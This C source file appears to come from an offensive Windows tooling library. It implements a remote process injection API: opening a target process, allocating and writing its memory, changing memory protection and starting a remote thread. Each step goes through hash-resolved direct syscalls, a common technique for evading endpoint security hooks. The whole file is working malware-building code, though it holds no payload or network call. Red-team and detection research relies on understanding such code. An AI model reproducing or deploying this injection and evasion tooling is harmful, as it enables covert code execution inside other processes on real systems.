#include <sindri/common/status.h>
#include <sindri/internal/nt/types.h>
#include <sindri/primitives/process.h>
#include <sindri/primitives/syscalls.h>
#include <sindri_hashes.h>
#include <windows.h>

extern snd_syscall_invoker_t g_syscall_invoker;

static snd_status_t WINAPI sys_open_process(DWORD pid, DWORD desired_access, HANDLE *out_process) {
    if (!out_process)
        return SND_ERR(SND_STATUS_NULL_POINTER);
    *out_process = NULL;

    snd_syscall_entry_t entry  = {0};
    snd_status_t        status = snd_syscall_resolve(SND_HASH_NTOPENPROCESS, &entry);
    if (SND_FAILED(status))
        return status;

    SND_CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = 0;

    SND_OBJECT_ATTRIBUTES oa = {0};
    SND_InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    snd_syscall_args_t args = {0};
    args.ssn                = entry.wSystemCall;
    args.sys_addr           = entry.pSyscallAddr;
    args.arg1               = out_process;
    args.arg2               = (PVOID)(ULONG_PTR)desired_access;
    args.arg3               = &oa;
    args.arg4               = (PVOID)&cid;

    if (g_syscall_invoker == NULL) {
        return SND_ERR_CTX(SND_STATUS_NOT_INITIALIZED, "g_syscall_invoker is NULL");
    }
    NTSTATUS nt_status = g_syscall_invoker(&args);
    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_PROCESS_OPEN_FAILED, nt_status);
}

static snd_status_t WINAPI sys_alloc_remote(HANDLE process, SIZE_T size, DWORD allocation_type, DWORD protect,
                                            PVOID *out_address) {
    if (!out_address)
        return SND_ERR(SND_STATUS_NULL_POINTER);
    *out_address = NULL;

    snd_syscall_entry_t entry  = {0};
    snd_status_t        status = snd_syscall_resolve(SND_HASH_NTALLOCATEVIRTUALMEMORY, &entry);
    if (SND_FAILED(status))
        return status;

    PVOID  local_base = NULL;
    SIZE_T local_size = size;

    snd_syscall_args_t args = {0};
    args.ssn                = entry.wSystemCall;
    args.sys_addr           = entry.pSyscallAddr;
    args.arg1               = process;
    args.arg2               = &local_base;
    args.arg3               = 0;
    args.arg4               = &local_size;
    args.arg5               = (PVOID)(ULONG_PTR)allocation_type;
    args.arg6               = (PVOID)(ULONG_PTR)protect;

    if (g_syscall_invoker == NULL) {
        return SND_ERR(SND_STATUS_NOT_INITIALIZED);
    }
    NTSTATUS nt_status = g_syscall_invoker(&args);
    if (SND_NT_SUCCESS(nt_status)) {
        *out_address = local_base;
        return SND_OK;
    }
    return SND_ERR_NT(SND_STATUS_VIRTUAL_ALLOC_FAILED, nt_status);
}

static snd_status_t WINAPI sys_write_remote(HANDLE process, PVOID base_address, const void *buffer, SIZE_T size,
                                            SIZE_T *bytes_written) {
    snd_syscall_entry_t entry  = {0};
    snd_status_t        status = snd_syscall_resolve(SND_HASH_NTWRITEVIRTUALMEMORY, &entry);
    if (SND_FAILED(status))
        return status;

    SIZE_T written = 0;

    snd_syscall_args_t args = {0};
    args.ssn                = entry.wSystemCall;
    args.sys_addr           = entry.pSyscallAddr;
    args.arg1               = process;
    args.arg2               = base_address;
    args.arg3               = (PVOID)buffer;
    args.arg4               = (PVOID)size;
    args.arg5               = &written;

    if (g_syscall_invoker == NULL) {
        return SND_ERR(SND_STATUS_NOT_INITIALIZED);
    }
    NTSTATUS nt_status = g_syscall_invoker(&args);
    if (bytes_written)
        *bytes_written = written;
    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_VIRTUAL_WRITE_FAILED, nt_status);
}

static snd_status_t WINAPI sys_protect_remote(HANDLE process, PVOID base_address, SIZE_T size, DWORD new_protect,
                                              DWORD *old_protect) {
    snd_syscall_entry_t entry  = {0};
    snd_status_t        status = snd_syscall_resolve(SND_HASH_NTPROTECTVIRTUALMEMORY, &entry);
    if (SND_FAILED(status))
        return status;

    PVOID  addr       = base_address;
    SIZE_T regionSize = size;
    ULONG  oldProt    = 0;

    snd_syscall_args_t args = {0};
    args.ssn                = entry.wSystemCall;
    args.sys_addr           = entry.pSyscallAddr;
    args.arg1               = process;
    args.arg2               = &addr;
    args.arg3               = &regionSize;
    args.arg4               = (PVOID)(ULONG_PTR)new_protect;
    args.arg5               = &oldProt;

    if (g_syscall_invoker == NULL) {
        return SND_ERR(SND_STATUS_NOT_INITIALIZED);
    }
    NTSTATUS nt_status = g_syscall_invoker(&args);
    if (old_protect)
        *old_protect = oldProt;
    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_VIRTUAL_PROTECT_FAILED, nt_status);
}

static snd_status_t WINAPI sys_create_remote_thread(HANDLE process, PVOID start_address, PVOID parameter,
                                                    HANDLE *out_thread) {
    if (!out_thread)
        return SND_ERR(SND_STATUS_NULL_POINTER);
    *out_thread = NULL;

    snd_syscall_entry_t entry  = {0};
    snd_status_t        status = snd_syscall_resolve(SND_HASH_NTCREATETHREADEX, &entry);
    if (SND_FAILED(status))
        return status;

    snd_syscall_args_t args = {0};
    args.ssn                = entry.wSystemCall;
    args.sys_addr           = entry.pSyscallAddr;
    args.arg1               = out_thread;
    args.arg2               = (PVOID)(ULONG_PTR)0x1FFFFF;
    args.arg3               = NULL;
    args.arg4               = process;
    args.arg5               = start_address;
    args.arg6               = parameter;
    args.arg7               = 0;
    args.arg8               = 0;
    args.arg9               = 0;
    args.arg10              = 0;
    args.arg11              = NULL;

    if (g_syscall_invoker == NULL) {
        return SND_ERR(SND_STATUS_NOT_INITIALIZED);
    }
    NTSTATUS nt_status = g_syscall_invoker(&args);
    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_THREAD_CREATE_FAILED, nt_status);
}

static snd_status_t WINAPI sys_close_handle(HANDLE handle) {
    snd_syscall_entry_t entry  = {0};
    snd_status_t        status = snd_syscall_resolve(SND_HASH_NTCLOSE, &entry);
    if (SND_FAILED(status))
        return status;

    snd_syscall_args_t args = {0};
    args.ssn                = entry.wSystemCall;
    args.sys_addr           = entry.pSyscallAddr;
    args.arg1               = handle;

    if (g_syscall_invoker == NULL) {
        return SND_ERR(SND_STATUS_NOT_INITIALIZED);
    }
    NTSTATUS nt_status = g_syscall_invoker(&args);
    return SND_NT_SUCCESS(nt_status) ? SND_OK : SND_ERR_NT(SND_STATUS_HANDLE_CLOSE_FAILED, nt_status);
}

const snd_process_api_t snd_proc_sys = {.open_process         = sys_open_process,
                                        .alloc_remote         = sys_alloc_remote,
                                        .write_remote         = sys_write_remote,
                                        .protect_remote       = sys_protect_remote,
                                        .create_remote_thread = sys_create_remote_thread,
                                        .close_handle         = sys_close_handle};
